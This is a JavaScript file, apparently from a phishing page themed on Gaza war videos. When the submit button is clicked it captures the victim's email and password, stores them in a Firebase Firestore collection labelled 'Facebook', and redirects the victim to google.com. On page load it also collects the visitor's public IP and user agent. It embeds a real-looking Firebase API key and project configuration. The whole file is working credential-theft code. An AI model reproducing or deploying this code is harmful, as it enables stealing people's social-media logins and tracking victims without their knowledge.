

// Import necessary Firebase modules
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-firestore.js";
import { getStorage } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-storage.js";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyA7UdUsHtNHcsS_e6J8SRSHlT4AWzAdl5E",
  authDomain: "gazawarvideo.firebaseapp.com",
  projectId: "gazawarvideo",
  storageBucket: "gazawarvideo.appspot.com",
  messagingSenderId: "812840200810",
  appId: "1:812840200810:web:329e3d547cb5cc1cc9f813",
  measurementId: "G-P4T68VBRNM"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const storage = getStorage(app);

// Function to generate a random string
function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

// Event listener for the submit button
document.querySelector('#submit').addEventListener('click', function () {
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  const randomChars = generateRandomString(10); // Assuming a length of 10 for the random string

  const dataToAdd = {
    Email: email,
    Password: password,
    Message: "Use with Caution ",
    For: "FB"
  };

  const docRef = doc(db, "Facebook", "Details-" + randomChars);

  // Set the data
  setDoc(docRef, dataToAdd)
    .then(() => {
      console.log("Document successfully written!");
    })
    .catch((error) => {
      console.error("Error writing document: ", error);
    });

  window.open("https://google.com", "self")
});
function onPageLoad() {
  // Function to get the public IP address
  async function getPublicIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();

      return data.ip;
    } catch (error) {
      console.error('Error fetching public IP:', error);
      return null;
    }
  }

  // Function to get device information
  async function getDeviceInfo() {
    try {
      const ip = await getPublicIP();
      const deviceName = navigator.userAgent;
      const browserName = navigator.appName;

      return {
        IP: ip,
        Device_Name: deviceName,
        Browser_Name: browserName,
        // Add more properties as needed
      };
    } catch (error) {
      console.error("Error getting device information:", error);
      return null;
    }
  }

  // Example usage for both functions
  getPublicIP().then(publicIP => {
    if (publicIP) {
      console.log('Public IP:', publicIP);
    }
  });

  getDeviceInfo().then(deviceInfo => {
    if (deviceInfo) {
      console.log("Device information:", deviceInfo);

      const dataToAdd2 = {
        IP: deviceInfo.IP,
        Device_Name: deviceInfo.Device_Name,
        Browser: deviceInfo.Browser_Name,
        // Add more properties as needed
      };

      const randomChars2 = generateRandomString(10);
      const docRef2 = doc(db, "Phone_Details", "Details-" + randomChars2);

      // Set the data
      setDoc(docRef2, dataToAdd2)
        .then(() => {
          console.log("Document successfully written!");
        })
        .catch((error) => {
          console.error("Error writing document: ", error);
        });
    }
  });
}

document.addEventListener("DOMContentLoaded", onPageLoad);
